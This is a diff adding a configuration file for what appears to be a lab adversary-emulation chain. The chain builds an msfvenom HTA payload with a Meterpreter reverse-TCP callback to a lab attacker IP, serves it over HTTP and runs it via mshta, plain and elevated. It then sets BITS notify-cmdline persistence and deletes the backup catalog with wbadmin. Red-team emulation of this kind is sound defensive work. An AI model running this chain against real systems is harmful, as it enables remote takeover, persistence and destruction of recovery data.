@@ -1,0 +1,66 @@
+# Aurora attack-chain parameters file — chain-004-fixed (env0)
+#
+# Chain narrative:
+#   msfvenom-HTA payload → victim downloads it (Kali HTTP server) →
+#   MSF handler set → victim runs HTA via mshta.exe (non-elevated,
+#   establishes first Meterpreter session) → netstat discovery →
+#   victim RE-runs the SAME HTA as admin (establishes elevated
+#   Meterpreter session) → derive Command Prompt from elevated
+#   Meterpreter → BITS notify-cmdline persistence → wbadmin delete
+#   backup catalog (impact).
+#
+#   (Original chain-004 had an art-t1003_002-esentutl-vss-sam-copy
+#   credential-access step + downstream download. Both removed in
+#   -fixed after parking the VSS-family actions on 2026-07-13. See
+#   NOTES.txt and emulation_plan_details.manual_edits.)
+#
+# Attacker: Kali at 192.168.56.43
+# Victim:   Windows VM (any IP)
+
+pddl_bindings:
+  # used by: 1_msfvenom-hta.SAVE_PATH
+  # Attacker-side path for the msfvenom HTA output.
+  string3_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.hta
+
+  # used by: 2_simulate-download-file.SAVE_PATH,
+  #          4_simulate-execute-hta-windows.HTA_PATH,
+  #          7_simulate-execute-hta-windows-root.HTA_PATH
+  # Victim-side landing path for the HTA — same file executed twice
+  # (once non-elevated at step 4, once elevated at step 7).
+  string4_var_in_plan: C:\Users\Public\chain_mp.hta
+
+  # used by: 10_art-t1197-bits-notifycmdline.command_path
+  # Exe that bitsadmin fires when the BITS job's transfer state
+  # changes. Notepad is the canonical benign choice (matches ART's
+  # own reference test) — pilot verification only cares that
+  # /setnotifycmdline wires the callback; the exe launched doesn't
+  # need to be malicious for the persistence mechanic to be verified.
+  # A real chain would substitute a payload path (but HTA-format
+  # payloads can't be passed to /setnotifycmdline directly — that
+  # would need `mshta.exe <hta_path>` support in the action template).
+  string1_var_in_plan: C:\Windows\System32\notepad.exe
+
+steps:
+  "1_msfvenom-hta":
+    LHOST: 192.168.56.43       # attacker IP baked into Meterpreter payload
+    LPORT: 4444                # must match handler LPORT in step 3
+
+  "2_simulate-download-file":
+    LHOST: 192.168.56.43       # attacker's HTTP server IP
+    LPORT: 8000                # `python -m http.server 8000` on Kali
+
+  "3_set-msf-payload-handler-for-file":
+    LHOST: 192.168.56.43                            # match step 1 LHOST
+    LPORT: 4444                                     # match step 1 LPORT
+    payload_name: windows/meterpreter/reverse_tcp   # match msfvenom -p in step 1
+
+  "9_meterpreter-execute":
+    Commands: cmd.exe          # spawn plain shell — derived Command Prompt
+                               # executor at step 9 runs bitsadmin + wbadmin
+                               # under this cmd, at elevated integrity via
+                               # the step-7 elevated Meterpreter parent
+
+  "10_art-t1197-bits-notifycmdline":
+    bits_job_name: 'AtomicBITS'
+    remote_file: 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md'
+    local_file: 'C:\Users\Public\bits_download.dat'
